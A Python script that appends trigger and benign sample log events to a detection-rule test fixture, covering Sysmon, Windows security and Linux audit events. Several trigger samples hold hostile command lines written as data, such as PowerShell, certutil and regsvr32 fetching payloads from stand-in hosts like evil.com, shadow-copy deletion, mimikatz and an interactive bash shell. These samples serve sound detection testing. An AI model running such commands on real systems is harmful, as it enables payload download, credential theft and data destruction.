with open('tests/create_logs.py', 'r', encoding='utf-8') as f:
    content = f.read()

new_logs = r'''    ,"de-ae-02/powershell-encoded": {
        "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA"}}}\n',
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"powershell.exe Get-Process"}}}\n'
    },
    "de-ae-02/powershell-download": {
        "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"powershell.exe (New-Object Net.WebClient).DownloadString(\'http://bad.com/payload\')"}}}\n',
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"powershell.exe Write-Host"}}}\n'
    },
    "de-ae-02/schtasks-create": {
        "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"schtasks.exe /create /tn \\"malicious\\" /tr \\"cmd.exe\\" /sc onstart"}}}\n',
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"schtasks.exe /query"}}}\n'
    },
    "de-ae-02/registry-run": {
        "trigger": '{"win":{"system":{"eventID":"13","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"targetObject":"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\malware"}}}\n',
        "benign": '{"win":{"system":{"eventID":"13","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"targetObject":"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\legit"}}}\n'
    },
    "de-ae-02/vssadmin-delete": {
        "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"vssadmin delete shadows /all /quiet"}}}\n',
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"vssadmin list shadows"}}}\n'
    },
    "pr-aa-01/new-admin": {
        "trigger": '{"win":{"system":{"eventID":"4732","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"targetUserName":"Domain Admins"}}}\n',
        "benign": '{"win":{"system":{"eventID":"4732","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"targetUserName":"Standard Users"}}}\n'
    },
    "pr-aa-05/rdp-port-change": {
        "trigger": '{"win":{"system":{"eventID":"13","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"targetObject":"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\WinStations\\\\RDP-Tcp\\\\PortNumber"}}}\n',
        "benign": '{"win":{"system":{"eventID":"13","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"targetObject":"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\LegitKey"}}}\n'
    },
    "de-ae-02/wmi-event": {
        "trigger": '{"win":{"system":{"eventID":"19","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"eventType":"WmiFilterEvent","operation":"Created","filterName":"__EventFilter"}}}\n',
        "benign": '{"win":{"system":{"eventID":"19","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"eventType":"WmiFilterEvent","operation":"Deleted","filterName":"NormalFilter"}}}\n'
    },
    "de-ae-02/lsass-access": {
        "trigger": '{"win":{"system":{"eventID":"10","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"targetImage":"C:\\\\Windows\\\\System32\\\\lsass.exe","grantedAccess":"0x1010"}}}\n',
        "benign": '{"win":{"system":{"eventID":"10","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"targetImage":"C:\\\\Windows\\\\System32\\\\lsass.exe","grantedAccess":"0x1400"}}}\n'
    },
    "de-ae-02/mimikatz": {
        "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"mimikatz.exe privilege::debug"}}}\n',
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"ping 8.8.8.8"}}}\n'
    },
    "de-cm-01/pass-the-hash": {
        "trigger": '{"win":{"system":{"eventID":"4624","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"logonType":"9","logonProcessName":"seclogo","authenticationPackageName":"Negotiate"}}}\n',
        "benign": '{"win":{"system":{"eventID":"4624","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"logonType":"3","logonProcessName":"NtLmSsp","authenticationPackageName":"NTLM"}}}\n'
    },
    "id-ra-03/dcsync": {
        "trigger": '{"win":{"system":{"eventID":"4662","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"properties":"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2","accessMask":"0x100"}}}\n',
        "benign": '{"win":{"system":{"eventID":"4662","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"properties":"normal-guid","accessMask":"0x0"}}}\n'
    },
    "id-ra-03/kerberoasting": {
        "trigger": '{"win":{"system":{"eventID":"4769","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"ticketOptions":"0x40810000","ticketEncryptionType":"0x17"}}}\n',
        "benign": '{"win":{"system":{"eventID":"4769","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"ticketOptions":"0x40810000","ticketEncryptionType":"0x18"}}}\n'
    },
    "de-ae-02/lockouts": {
        "trigger": '{"win":{"system":{"eventID":"4740","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"ipAddress":"10.0.0.5"}}}\n'*5,
        "benign": '{"win":{"system":{"eventID":"4624","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"ipAddress":"10.0.0.5"}}}\n'
    },
    "pr-aa-05/linux-shadow": {
        "trigger": 'type=SYSCALL msg=audit(1779953406.123:466): path=/etc/shadow uid=1000 exe="/bin/cat"\n',
        "benign": 'type=SYSCALL msg=audit(1779953406.123:466): path=/etc/shadow uid=0 exe="/usr/bin/passwd"\n'
    },
    "de-ae-02/reverse-shell": {
        "trigger": 'type=SYSCALL msg=audit(1779953407.123:467): exe="bash -i"\n',
        "benign": 'type=SYSCALL msg=audit(1779953407.123:467): exe="/bin/bash"\n'
    },
    "de-ae-02/base64-cmd": {
        "trigger": 'type=SYSCALL msg=audit(1779953408.123:468): exe="base64 -d dGhpcyBpcyBhIHZlcnkgbG9uZyBzdHJpbmcgZm9yIGJhc2U2NA=="\n',
        "benign": 'type=SYSCALL msg=audit(1779953408.123:468): exe="base64 file.txt"\n'
    },
    "de-ae-03/dns-tunnel": {
        "trigger": '{"win":{"system":{"eventID":"22","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"queryName":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.com"}}}\n',
        "benign": '{"win":{"system":{"eventID":"22","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"queryName":"google.com"}}}\n'
    },
    "de-ae-03/tor-exit": {
        "trigger": 'type=SYSCALL msg=audit(1779953409.123:469): dstip="known_tor_node"\n',
        "benign": 'type=SYSCALL msg=audit(1779953409.123:469): dstip="8.8.8.8"\n'
    },
    "de-ae-02/beaconing": {
        "trigger": '{"win":{"system":{"eventID":"3","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"destinationIsIpv6":"false","destinationIp":"1.2.3.4"}}}\n'*20,
        "benign": '{"win":{"system":{"eventID":"3","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"destinationIsIpv6":"false","destinationIp":"8.8.8.8"}}}\n'
    },
    "de-ae-02/certutil": {
        "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"certutil.exe -urlcache -split -f http://evil.com/payload"}}}\n',
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"certutil.exe -hashfile"}}}\n'
    },
    "de-ae-02/regsvr32": {
        "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll"}}}\n',
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"regsvr32.exe legit.dll"}}}\n'
    },
    "gv-po-01/admin-hours": {
        "trigger": '{"win":{"system":{"eventID":"4624","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"targetUserName":"Administrator"}}}\n',
        "benign": '{"win":{"system":{"eventID":"4624","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"targetUserName":"Guest"}}}\n'
    },
    "rc-rp-01/backup-fail": {
        "trigger": 'Dec 10 14:30:00 server veeam: Backup job failed terminated unexpectedly\n',
        "benign": 'Dec 10 14:30:00 server veeam: Backup job completed successfully\n'
    }
}
'''
if "powershell-encoded" not in content:
    content = content.replace('}\n\n# Write files', new_logs + '\n# Write files')
    with open('tests/create_logs.py', 'w', encoding='utf-8') as f:
        f.write(content)
    print("Appended tests to create_logs.py")
else:
    print("Tests already appended.")
